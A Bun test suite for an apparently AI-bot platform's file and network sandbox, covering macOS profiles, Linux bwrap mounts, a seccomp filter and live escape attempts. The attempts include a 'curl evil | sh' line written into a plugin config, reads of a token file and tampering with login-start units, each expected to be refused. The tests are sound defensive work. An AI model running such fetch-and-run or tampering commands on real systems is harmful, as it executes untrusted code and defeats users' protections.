import { describe, expect, test } from "bun:test";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { Caller } from "@waifucave/clover-protocol";
import { CloverFence } from "../../src/fence/fence";
import { fencedSpawner } from "../../src/fence/fenced-process";
import { bwrapArgs, bwrapPlan, heldFolderNote, unixSocketFilter } from "../../src/fence/linux-bwrap";
import { macFenceProfile } from "../../src/fence/macos-profile";
import { callerPlaces } from "../../src/fence/per-caller";
import type { FencedRun, FencedRunResult } from "../../src/fence/spawn";

const mac = process.platform === "darwin" && existsSync("/usr/bin/sandbox-exec");
const linuxBwrap = process.platform === "linux" && existsSync("/usr/bin/bwrap")
  && Bun.spawnSync(["/usr/bin/bwrap", "--ro-bind", "/", "/", "--dev", "/dev", "--proc", "/proc", "--unshare-net", "--unshare-pid", "/bin/true"]).exitCode === 0;
const here = process.platform === "darwin" ? "macos" : "linux";

const botCaller = (bot: string, sessionId: string): Caller => ({ kind: "session", sessionId, sessionKind: "bot", bot });

function world() {
  const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-fp-")));
  const home = join(root, "home"), clover = join(home, ".clover"), temp = join(root, "tmp"), outside = join(root, "outside");
  for (const d of [join(clover, "settings"), join(clover, "run"), join(clover, "plugins-state", "oks"), join(home, "project"), temp, outside]) mkdirSync(d, { recursive: true });
  writeFileSync(join(clover, "settings.json"), "orig");
  writeFileSync(join(clover, "run", "token"), "secret-ish");
  const fence = new CloverFence({ os: here, home, cloverHome: clover, temp });
  const spawner = fencedSpawner({ fence });
  const run = (command: string, who: FencedRun["who"] = { caller: { kind: "session", sessionId: "c1", sessionKind: "coding" } }) => spawner.run({ command, cwd: join(home, "project"), env: { PATH: "/usr/bin:/bin", HOME: home }, timeoutMs: 15_000, who });
  return { root, home, clover, temp, outside, fence, spawner, run };
}

function worldBot() {
  const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-fp-")));
  const home = join(root, "home"), clover = join(home, ".clover"), temp = join(root, "tmp"), outside = join(root, "outside");
  for (const d of [join(clover, "settings"), join(clover, "run"), join(clover, "plugins-state", "oks"), join(home, "project"), temp, outside]) mkdirSync(d, { recursive: true });
  writeFileSync(join(clover, "settings.json"), "orig");
  writeFileSync(join(clover, "run", "token"), "secret-ish");
  const fence = new CloverFence({ os: here, home, cloverHome: clover, temp });
  const spawner = fencedSpawner({ fence });
  // A bot's own session (main conversation or side thread)
  const run = (command: string, who: FencedRun["who"] = { caller: botCaller("luna", "s1") }) => spawner.run({ command, cwd: join(home, "project"), env: { PATH: "/usr/bin:/bin", HOME: home }, timeoutMs: 15_000, who });
  return { root, home, clover, temp, outside, fence, spawner, run };
}

const ok = (r: FencedRunResult) => r.kind === "exited" && r.code === 0;

describe("the macOS profile, as text", () => {
  test("Clover home default-deny first; holder folders; naming allows; specific fenced denies; per-caller allows last", () => {
    // Policy matching the real fence: Clover home in denyWrite/denyRead for default-deny,
    // plus specific fenced items.
    const p = macFenceProfile({ cloverHome: "/U/me/.clover", perUserTemp: null, policy: {
      allowWrite: ["/U/me", "/tmp/x"],
      denyWrite: ["/U/me/.clover/settings.json", "/U/me/.clover/plugins-state/oks", "/U/me/.clover"],
      denyRead: ["/U/me/.clover/run", "/U/me/.clover"],
      closedDoors: ["open", "launchctl", "osascript"], blockedAddresses: [], network: "none" } });
    const at = (s: string) => p.indexOf(s);
    // Strings stored in variables to avoid TypeScript parser issues with parentheses in string literals.
    const denyCloverHome = '(deny file-write* (subpath "/U/me/.clover")';
    const allowWriteSubpath = '(allow file-write* (subpath';
    const denyPluginsStateLiteral = '(deny file-write* (literal "/U/me/.clover/plugins-state")';
    const denyHomeLiteral = '(deny file-write* (literal "/U/me")';
    const allowPluginsStateRegex = '(allow file-write* (regex #"^/U/me/\\.clover/plugins-state/[ -.0-~]+(/|$)")';
    const denySettingsJson = '(subpath "/U/me/.clover/settings.json")';
    const denyPluginsStateOks = '(subpath "/U/me/.clover/plugins-state/oks")';
    const allowCloverHomeRegex = '(allow file-write* (regex #"^/U/me/\\.clover/[ -.0-~]+(/|$)")';
    const denyRunSubpath = '(deny file-read* (subpath "/U/me/.clover/run")';
    // 1. Clover home default-deny (subpath) comes after allowWrite
    expect(at(denyCloverHome)).toBeGreaterThan(at(allowWriteSubpath));
    // 2. Holder folder denies (literal) come after Clover home deny
    expect(at(denyPluginsStateLiteral)).toBeGreaterThan(at(denyCloverHome));
    expect(at(denyHomeLiteral)).toBeGreaterThan(at(denyCloverHome)); // renaming home moves Clover home
    expect(p).not.toContain('(literal "/U")'); // above writable roots nothing writable
    // 3. Naming folder allow for plugins-state (parent of fenced plugins-state/oks) comes after holder denies
    expect(at(allowPluginsStateRegex)).toBeGreaterThan(at(denyPluginsStateLiteral));
    // 4. Specific fenced item denies (settings.json, plugins-state/oks) come AFTER naming folder allows
    expect(at(denySettingsJson)).toBeGreaterThan(at(allowPluginsStateRegex));
    expect(at(denyPluginsStateOks)).toBeGreaterThan(at(allowPluginsStateRegex));
    // 5. No naming folder allow for .clover itself (Clover home is default-deny, not a naming folder)
    expect(p).not.toContain(allowCloverHomeRegex);
    expect(p).toContain(denyRunSubpath);
    expect(p).toContain('(deny process-exec (literal "/usr/bin/open") (literal "/bin/launchctl") (literal "/usr/bin/osascript"))');
    expect(p.trim().endsWith("(deny network*)")).toBe(true);
  });

  test("the caller's rules: its own folders read and write after the denies; the home stays denied otherwise", () => {
    const caller = callerPlaces("/U/me/.clover", "macos", { sessionId: "s1", memoryOf: "luna" });
    const p = macFenceProfile({ cloverHome: "/U/me/.clover", perUserTemp: null, caller, policy: {
      allowWrite: ["/U/me"], denyWrite: ["/U/me/.clover"], denyRead: ["/U/me/.clover"],
      closedDoors: [], blockedAddresses: [], network: "none" } });
    const at = (s: string) => p.indexOf(s);
    const homeDeny = '(deny file-write* (subpath "/U/me/.clover")';
    const allowOwnBot = '(allow file-read* (regex #"^/U/me/\\.clover/bots/luna(/|$)"))';
    const allowMemoryRw = '(allow file-read* file-write* (regex #"^/U/me/\\.clover/bots/luna/memory/"))';
    const denyMemoryWrite = '(deny file-write* (literal "/U/me/.clover/bots/luna/memory"))';
    // The owner's bot folder reads, its memory reads and writes (but never over itself), after the home deny.
    expect(at(allowOwnBot)).toBeGreaterThan(at(homeDeny));
    expect(at(allowMemoryRw)).toBeGreaterThan(at(homeDeny));
    expect(at(denyMemoryWrite)).toBeGreaterThan(at(allowMemoryRw));
    // Its session's outputs, its scratch and its routines read and write too.
    expect(p).toContain('(allow file-read* file-write* (regex #"^/U/me/\\.clover/outputs/s1/"))');
    expect(p).toContain('(allow file-read* file-write* (regex #"^/U/me/\\.clover/scratch/luna/"))');
    expect(p).toContain('(allow file-read* file-write* (regex #"^/U/me/\\.clover/routines/luna/"))');
    // No plugin-data allow: this runner is no plugin.
    expect(p).not.toContain("plugin-data");
    // A runner that is a coding session gets its outputs, and no bot folder, memory, scratch or routines.
    const someoneElse = macFenceProfile({ cloverHome: "/U/me/.clover", perUserTemp: null, policy: {
      allowWrite: ["/U/me"], denyWrite: [], denyRead: [], closedDoors: [], blockedAddresses: [], network: "none" },
      caller: callerPlaces("/U/me/.clover", "macos", { sessionId: "c1" }) });
    expect(someoneElse).toContain('(allow file-read* file-write* (regex #"^/U/me/\\.clover/outputs/c1/"))');
    expect(someoneElse).not.toContain("/U/me/\\.clover/bots/");
    expect(someoneElse).not.toContain("/U/me/\\.clover/scratch/");
    expect(someoneElse).not.toContain("/U/me/\\.clover/routines/");
  });
});

describe("the Linux sandbox's mounts, as arguments", () => {
  test("the Clover home is a tmpfs view holding nothing without a caller; outside items read-only", () => {
    const dirs = new Set(["/h", "/h/.clover", "/h/.clover/settings", "/h/.clover/run", "/h/dev", "/h/dev/luna", "/t", "/run/user/1000"]);
    const files = new Set(["/h/.clover/settings.json", "/h/.clover/notes.txt"]);
    const fs = {
      kind: (p: string) => (dirs.has(p) ? "dir" as const : files.has(p) ? "file" as const : null),
      list: (d: string) => [...dirs, ...files].filter((p) => p !== d && p.startsWith(`${d}/`) && !p.slice(d.length + 1).includes("/")).map((p) => p.slice(d.length + 1)),
    };
    const a = bwrapArgs({ cloverHome: "/h/.clover", cwd: "/h/p", uid: 1000, fs, policy: {
      allowWrite: ["/h", "/t"], denyWrite: ["/h/.clover", "/h/.clover/settings.json", "/h/.clover/settings", "/h/dev/luna"],
      denyRead: ["/h/.clover", "/h/.clover/run"], closedDoors: ["systemd-run"], blockedAddresses: [], network: "none" } });
    const s = a.join(" ");
    expect(s.startsWith("--die-with-parent --new-session --unshare-net --unshare-pid")).toBe(true);
    expect(s).toContain("--ro-bind / / --dev /dev --proc /proc --bind /h /h --bind /t /t");
    // The home is a tmpfs view: nothing of it is bound back without a caller.
    expect(s).toContain("--tmpfs /h/.clover");
    expect(s).toContain("--remount-ro /h/.clover");
    expect(s).not.toContain("--ro-bind /h/.clover ");
    expect(s).not.toContain("--bind /h/.clover/settings ");
    expect(s).not.toContain("--bind /h/.clover/notes.txt ");
    // The top folders exist so a runner can list its own (empty) view.
    for (const t of ["bots", "outputs", "scratch", "routines", "plugin-data"]) expect(s).toContain(`--dir /h/.clover/${t}`);
    // Outside the home: the development folder read-only where it is, its holder a mount point.
    expect(s).toContain("--bind /h/dev /h/dev"); // holds a development folder: a mount point, so it can't be renamed
    expect(s).toContain("--ro-bind /h/dev/luna /h/dev/luna");
    expect(s).toContain("--tmpfs /run/user/1000");
    expect(s.endsWith("--chdir /h/p")).toBe(true);
  });

  test("the caller's view: only its own folders bound into the home's tmpfs view", () => {
    const dirs = new Set(["/h", "/h/.clover", "/h/.clover/bots", "/h/.clover/bots/luna", "/h/.clover/bots/luna/memory",
      "/h/.clover/bots/luna/agents", "/h/.clover/bots/sol", "/h/.clover/bots/sol/memory",
      "/h/.clover/outputs", "/h/.clover/outputs/s1", "/h/.clover/outputs/c1", "/h/.clover/outputs/a1",
      "/h/.clover/scratch", "/h/.clover/scratch/luna",
      "/h/.clover/routines", "/h/.clover/routines/luna", "/h/.clover/sdk", "/h/.clover/sdk/projects",
      "/h/.clover/sdk/projects/key", "/h/p"]);
    const files = new Set(["/h/.clover/sdk/projects/key/s.jsonl", "/h/.clover/bots/luna/memory/MEMORY.md"]);
    const fs = {
      kind: (p: string) => (p === "/h/.clover/projects" ? "other" as const : dirs.has(p) ? "dir" as const : files.has(p) ? "file" as const : null),
      list: (d: string) => [...dirs, ...files].filter((p) => p !== d && p.startsWith(`${d}/`) && !p.slice(d.length + 1).includes("/")).map((p) => p.slice(d.length + 1)),
    };
    const policy = { allowWrite: ["/h"], denyWrite: ["/h/.clover", "/h/.clover/sdk/projects", "/h/.clover/projects"],
      denyRead: ["/h/.clover", "/h/.clover/sdk/projects", "/h/.clover/projects"], closedDoors: [], blockedAddresses: [], network: "none" as const };
    const owner = callerPlaces("/h/.clover", "linux", { sessionId: "s1", memoryOf: "luna" });
    const s = bwrapArgs({ cloverHome: "/h/.clover", cwd: "/h/p", uid: 1000, fs, caller: owner, policy }).join(" ");
    expect(s).toContain("--tmpfs /h/.clover");
    // Its own bot folder reads; its memory, outputs, scratch and routines read and write.
    expect(s).toContain("--ro-bind /h/.clover/bots/luna /h/.clover/bots/luna");
    expect(s).toContain("--bind /h/.clover/bots/luna/memory /h/.clover/bots/luna/memory");
    expect(s).toContain("--bind /h/.clover/outputs/s1 /h/.clover/outputs/s1");
    expect(s).toContain("--bind /h/.clover/scratch/luna /h/.clover/scratch/luna");
    expect(s).toContain("--bind /h/.clover/routines/luna /h/.clover/routines/luna");
    expect(s).not.toContain("bots/sol");
    // The transcript store stays hidden: nothing of it is bound back.
    expect(s).not.toContain("sdk/projects");
    expect(s).not.toContain("/h/.clover/projects");
    // A coding session or an agent: only its own outputs, no bot folder at all.
    for (const ctx of [{ sessionId: "c1" }, { sessionId: "a1" }]) {
      const other = bwrapArgs({ cloverHome: "/h/.clover", cwd: "/h/p", uid: 1000, fs, caller: callerPlaces("/h/.clover", "linux", ctx), policy }).join(" ");
      expect(other).toContain("--tmpfs /h/.clover");
      expect(other).toContain(`--bind /h/.clover/outputs/${ctx.sessionId} /h/.clover/outputs/${ctx.sessionId}`);
      expect(other).not.toContain("bots/luna");
      expect(other).not.toContain("bots/sol");
    }
  });
});

describe("a folder held for a fenced file that isn't there yet (accepted for now, the controller's ruling)", () => {
  test("the plan names it, and a read-only refusal there is explained: which file, a subfolder, or ask the user", () => {
    const dirs = new Set(["/h", "/h/.clover", "/t"]);
    const fs = { kind: (p: string) => (dirs.has(p) ? "dir" as const : p === "/h/.bashrc" ? "file" as const : null), list: () => [] as string[] };
    const { held } = bwrapPlan({ cloverHome: "/h/.clover", cwd: "/h", uid: 1, fs, policy: {
      allowWrite: ["/h", "/t"], denyWrite: ["/h/.bashrc", "/h/.zshrc", "/h/.clover/settings.json"], denyRead: [], closedDoors: [], blockedAddresses: [], network: "none" } });
    expect(held).toEqual([{ folder: "/h", because: "/h/.zshrc" }]);
    const note = heldFolderNote("sh: 1: cannot create /h/new.txt: Read-only file system\n", held)!;
    expect(note).toContain("/h takes no new names under the fence, because /h/.zshrc is fenced");
    expect(note).toMatch(/subfolder.*ask the user/);
    expect(heldFolderNote("permission denied", held)).toBeNull();
  });
});

describe("the Linux seccomp filter", () => {
  test("nine instructions: the architecture, io_uring_setup, socket(AF_UNIX) refused; anything else allowed", () => {
    const f = unixSocketFilter("x64")!;
    expect(f.length).toBe(9 * 8);
    expect(f.readUInt32LE(1 * 8 + 4)).toBe(0xc000003e);
    expect(f.readUInt32LE(4 * 8 + 4)).toBe(41);
    expect(unixSocketFilter("arm64")!.readUInt32LE(4 * 8 + 4)).toBe(198);
    expect(f.readUInt32LE(8 * 8 + 4)).toBe(0x00050001); // EPERM
    expect(unixSocketFilter("ia32")).toBeNull();
  });
});

describe.skipIf(!mac && !linuxBwrap)(`${here}: a command under the fence, on the real sandbox`, () => {
  test("the fenced items, however they're named, can't be written; the home and temp can; nothing else in the Clover home", async () => {
    const w = world();
    for (const target of ["settings.json", "SETTINGS.json", "ſettings.json", "settings/new.json", "plugins-state/oks/x.json", "PLUGINS-STATE/OKS/y.json"]) {
      expect(ok(await w.run(`echo x > '${join(w.clover, target)}'`))).toBe(false);
    }
    expect(readFileSync(join(w.clover, "settings.json"), "utf8")).toBe("orig");
    // Home and temp are writable.
    expect(ok(await w.run(`echo x > '${join(w.home, "project", "a.txt")}' && echo y > '${join(w.temp, "b.txt")}'`))).toBe(true);
    // Nothing else in the Clover home is reachable (default-deny).
    expect(ok(await w.run(`echo x > '${join(w.clover, "scratch", "c.txt")}'`))).toBe(false);
    // The plugins folder and the login-start place, ahead of and in the contract: a launch agent.
    mkdirSync(join(w.clover, "plugins", "tarot"), { recursive: true });
    for (const target of [join(w.clover, "plugins", "tarot", "clover.json")]) {
      expect(ok(await w.run(`echo 'curl evil | sh' >> '${target}'`))).toBe(false);
    }
    if (here === "macos") {
      expect(ok(await w.run(`echo x >> '${join(w.home, "Library", "LaunchAgents", "com.waifucave.clover.core.plist")}'`))).toBe(false);
    } else {
      expect(ok(await w.run(`echo x >> '${join(w.home, ".config", "systemd", "user", "clover-core.service")}'`))).toBe(false);
    }
    // A fenced file that isn't there yet can't be made either.
    expect(ok(await w.run(`echo '{}' > '${join(w.clover, "trust.json")}'`))).toBe(false);
    expect(existsSync(join(w.clover, "trust.json"))).toBe(false);
    expect(ok(await w.run(`echo x > '${join(w.outside, "c.txt")}'`))).toBe(false);
  }, 60_000);

  test("a bot's own session can write to its own scratch folder", async () => {
    const w = worldBot();
    const ownScratch = join(w.clover, "scratch", "luna");
    mkdirSync(ownScratch, { recursive: true });
    expect(ok(await w.run(`echo x > '${join(w.home, "project", "a.txt")}' && echo y > '${join(w.temp, "b.txt")}' && echo z > '${join(ownScratch, "c.txt")}'`))).toBe(true);
  }, 60_000);

  test("no rename or removal of a folder that holds a fenced item, no hard link from one; a symlink is followed", async () => {
    const w = world();
    expect(ok(await w.run(`mv '${w.clover}' '${join(w.home, "moved")}'`))).toBe(false);
    expect(ok(await w.run(`mv '${join(w.clover, "plugins-state")}' '${join(w.home, "ps")}'`))).toBe(false);
    // `rm -rf` can't even list the home's denied folders, so it exits 0 deleting nothing: the state is the assertion.
    await w.run(`rm -rf '${w.clover}'`);
    expect(existsSync(join(w.clover, "settings.json"))).toBe(true);
    expect(readFileSync(join(w.clover, "settings.json"), "utf8")).toBe("orig");
    expect(ok(await w.run(`ln '${join(w.clover, "settings.json")}' '${join(w.home, "hl")}'`))).toBe(false);
    expect(ok(await w.run(`ln -s '${join(w.clover, "settings.json")}' '${join(w.home, "sl")}' && echo x > '${join(w.home, "sl")}'`))).toBe(false);
    expect(readFileSync(join(w.clover, "settings.json"), "utf8")).toBe("orig");
  }, 60_000);

  test("the run folder can't be read; non-ASCII names where Clover names things can't be made; the closed doors and the network are shut", async () => {
    const w = world();
    expect(ok(await w.run(`cat '${join(w.clover, "run", "token")}'`))).toBe(false);
    // Tool runners cannot read settings.json (Clover home is default-deny; only per-caller allows permit access).
    expect(ok(await w.run(`cat '${join(w.clover, "settings.json")}'`))).toBe(false);
    expect(ok(await w.run(`mkdir '${join(w.clover, "plugins-state", "öks")}'`))).toBe(false);
    expect(ok(await w.run(`mkdir '${join(w.clover, "nötes")}'`))).toBe(false);
    expect(ok(await w.run(`mkdir '${join(w.clover, "plugins-state", "new")}'`))).toBe(here === "macos"); // Linux: nothing new there
    expect(ok(await w.run(`mkdir -p '${join(w.home, "project", "nötes")}'`))).toBe(true); // the user's own names elsewhere
    if (here === "macos") {
      expect(ok(await w.run("/usr/bin/open -g -j /nonexistent-lane-c"))).toBe(false);
      expect(ok(await w.run("/bin/launchctl print system >/dev/null"))).toBe(false);
    } else {
      expect(ok(await w.run(`test -z "$(ls -A /run/user/${process.getuid!()} 2>/dev/null)"`))).toBe(true); // the user's bus is hidden
      // The home takes no new names while the login unit isn't there, and the refusal says which and why.
      const held = await w.run(`echo x > '${join(w.home, "new-top-level.txt")}'`);
      expect(held.kind === "exited" && held.code !== 0).toBe(true);
      expect(held.kind === "exited" && held.stderr).toMatch(new RegExp(`${w.home.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")} takes no new names under the fence, because \\S+ is fenced and isn't there yet; write in a subfolder of it, or ask the user`));
      // Its own pid namespace: a handful of its own processes, and not the daemon's.
      expect(ok(await w.run(`test $(ls /proc | grep -c '^[0-9]') -lt 10 && test ! -e /proc/${process.pid}/cmdline`))).toBe(true);
    }
  }, 60_000);

  test("no network: a listening loopback port and a Unix socket (as the daemon's) are both out of reach", async () => {
    const w = world();
    let tcpSeen = 0, unixSeen = 0;
    const tcp = Bun.listen({ hostname: "127.0.0.1", port: 0, socket: { open() { tcpSeen++; }, data() {} } });
    const sock = join(w.root, "d.sock");
    const unix = Bun.listen({ unix: sock, socket: { open() { unixSeen++; }, data() {} } });
    try {
      // Reachable from outside the sandbox, so a refusal inside is the sandbox's.
      const probe = (c: string) => `${process.execPath} -e '${c}'`;
      const tcpJs = `const s = await Bun.connect({ hostname: "127.0.0.1", port: ${tcp.port}, socket: { data() {} } }); s.end();`;
      const unixJs = `const s = await Bun.connect({ unix: ${JSON.stringify(sock)}, socket: { data() {} } }); s.end();`;
      expect(Bun.spawnSync([process.execPath, "-e", tcpJs]).exitCode).toBe(0);
      expect(ok(await w.run(probe(tcpJs)))).toBe(false);
      expect(ok(await w.run(probe(unixJs)))).toBe(false);
      await Bun.sleep(50);
      expect(tcpSeen).toBe(1); // only the check from outside
      expect(unixSeen).toBe(0);
    } finally { tcp.stop(true); unix.stop(true); }
  }, 60_000);

  test("bots' memory for runners: the owner's own conversations read and write it, every other runner is denied, nobody moves it", async () => {
    const w = world();
    const b = (...p: string[]) => join(w.clover, "bots", ...p);
    for (const d of [b("luna", "memory"), b("luna", "agents"), b("sol", "memory")]) mkdirSync(d, { recursive: true });
    writeFileSync(b("luna", "memory", "MEMORY.md"), "luna's");
    writeFileSync(b("sol", "memory", "MEMORY.md"), "sol's");
    writeFileSync(b("luna", "agents", "t.json"), "{}");
    const owner = { caller: botCaller("luna", "s1") };
    expect(ok(await w.run(`cat '${b("luna", "memory", "MEMORY.md")}' && echo more >> '${b("luna", "memory", "MEMORY.md")}' && echo n > '${b("luna", "memory", "new.md")}' && ls '${b("luna", "memory")}'`, owner))).toBe(true);
    expect(readFileSync(b("luna", "memory", "MEMORY.md"), "utf8")).toBe("luna'smore\n");
    expect(ok(await w.run(`cat '${b("sol", "memory", "MEMORY.md")}'`, owner))).toBe(false);
    expect(ok(await w.run(`echo x > '${b("luna", "agents", "t.json")}'`, owner))).toBe(false);
    expect(ok(await w.run(`cat '${b("luna", "agents", "t.json")}'`, owner))).toBe(true); // the rest of its folder reads
    // Its files are its own to remove; the memory folder itself stays.
    expect(ok(await w.run(`mv '${b("luna", "memory")}' '${b("luna", "m2")}'`, owner))).toBe(false);
    expect(ok(await w.run(`rm -rf '${b("luna", "memory")}'`, owner))).toBe(false);
    expect(existsSync(b("luna", "memory"))).toBe(true);
    writeFileSync(b("luna", "memory", "MEMORY.md"), "luna'smore\n");
    expect(ok(await w.run(`mkdir -p '${b("future", "memory")}' && echo seed > '${b("future", "memory", "MEMORY.md")}'`, owner))).toBe(false);
    expect(existsSync(b("future"))).toBe(false);
    // A side thread reads and writes the same memory.
    expect(ok(await w.run(`echo side >> '${b("luna", "memory", "MEMORY.md")}'`, { caller: { kind: "session", sessionId: "t1", sessionKind: "side-thread", bot: "luna" } }))).toBe(true);
    // Everyone else: the user's coding session, the bot's own agent, another bot.
    for (const who of [{ caller: session("c1") }, { caller: agent("luna") }, { caller: botCaller("sol", "s9") }]) {
      expect(ok(await w.run(`cat '${b("luna", "memory", "MEMORY.md")}'`, who))).toBe(false);
      expect(ok(await w.run(`echo x >> '${b("luna", "memory", "MEMORY.md")}'`, who))).toBe(false);
    }
    expect(readFileSync(b("luna", "memory", "MEMORY.md"), "utf8")).toBe("luna'smore\nside\n");
  }, 90_000);

  test("bots' folders for runners: its own bot's whole folder reads, every other runner sees none; transcripts hidden", async () => {
    const w = world();
    const b = (...p: string[]) => join(w.clover, "bots", ...p);
    const store = (...p: string[]) => join(w.clover, "sdk", "projects", ...p);
    for (const d of [b("luna", "memory"), b("luna", "agents"), b("sol", "memory"), join(w.clover, "sdk", "projects", "key")]) mkdirSync(d, { recursive: true });
    writeFileSync(b("luna", "memory", "MEMORY.md"), "luna's");
    writeFileSync(b("luna", "agents", "t.json"), "{}");
    writeFileSync(b("sol", "memory", "MEMORY.md"), "sol's");
    writeFileSync(store("key", "s.jsonl"), "{}");
    const owner = { caller: botCaller("luna", "s1") };
    expect(ok(await w.run(`cat '${b("luna", "agents", "t.json")}' && cat '${b("luna", "memory", "MEMORY.md")}' && cat '${b("luna", "memory", "MEMORY.md")}'`, owner))).toBe(true);
    expect(ok(await w.run(`ls '${b("luna")}'`, owner))).toBe(true);
    expect(ok(await w.run(`cat '${b("sol", "memory", "MEMORY.md")}'`, owner))).toBe(false);
    expect(ok(await w.run(`cat '${store("key", "s.jsonl")}'`, owner))).toBe(false);
    expect(ok(await w.run(`echo x > '${store("key", "s2.jsonl")}'`, owner))).toBe(false);
    if (here === "linux") {
      // The tmpfs view holds only its own folder (the folder name is there, nothing of any other bot).
      expect(ok(await w.run(`test "$(ls -A '${b()}')" = luna`, owner))).toBe(true);
      // Its own outputs, scratch and routines read and write there too (made for it on first run).
      for (const d of [join(w.clover, "outputs", "s1"), join(w.clover, "scratch", "luna")]) mkdirSync(d, { recursive: true });
      expect(ok(await w.run(`echo o > '${join(w.clover, "outputs", "s1", "r.md")}' && echo s > '${join(w.clover, "scratch", "luna", "n.md")}' && echo r > '${join(w.clover, "routines", "luna", "m.md")}'`, owner))).toBe(true);
      // Its plugin-data doesn't open for it; another plugin's neither opens for anyone else.
      expect(ok(await w.run(`echo x > '${join(w.clover, "plugin-data", "tarot", "d.json")}'`, { caller: { kind: "plugin", pluginId: "tarot" } }))).toBe(true);
    } else {
      expect(ok(await w.run(`ls '${b()}'`, owner))).toBe(false); // a listing would name every bot: denied outright
    }
    // Everyone else, its own agent and a coding session included: no bot folder, and the store still hidden.
    for (const who of [{ caller: session("c1") }, { caller: agent("luna") }]) {
      expect(ok(await w.run(`cat '${b("luna", "agents", "t.json")}'`, who))).toBe(false);
      expect(ok(await w.run(`cat '${b("luna", "memory", "MEMORY.md")}'`, who))).toBe(false);
      expect(ok(await w.run(`cat '${b("sol", "memory", "MEMORY.md")}'`, who))).toBe(false);
      if (here === "linux") expect(ok(await w.run(`test -z "$(ls -A '${b()}')"`, who))).toBe(true);
      else expect(ok(await w.run(`ls '${b()}'`, who))).toBe(false);
      expect(ok(await w.run(`cat '${store("key", "s.jsonl")}'`, who))).toBe(false);
    }
  }, 90_000);

  test("ordinary work runs: a shell pipeline, git init and commit in the project, mktemp", async () => {
    const w = world();
    const r = await w.run(`printf 'a\\nb\\n' | sort -r | head -1 && git init -q . && git -c user.email=t@e -c user.name=t commit -q --allow-empty -m x && git log --oneline | wc -l | tr -d ' ' && TMPDIR='${w.temp}' mktemp >/dev/null && echo done`);
    expect(r).toMatchObject({ kind: "exited", code: 0, shell: "sh" });
    expect(r.kind === "exited" && r.stdout).toBe("b\n1\ndone\n");
  }, 60_000);
});

const session = (sessionId: string): Caller => ({ kind: "session", sessionId, sessionKind: "coding" });
const agent = (bot: string): Caller => ({ kind: "session", sessionId: "a1", sessionKind: "agent", bot });
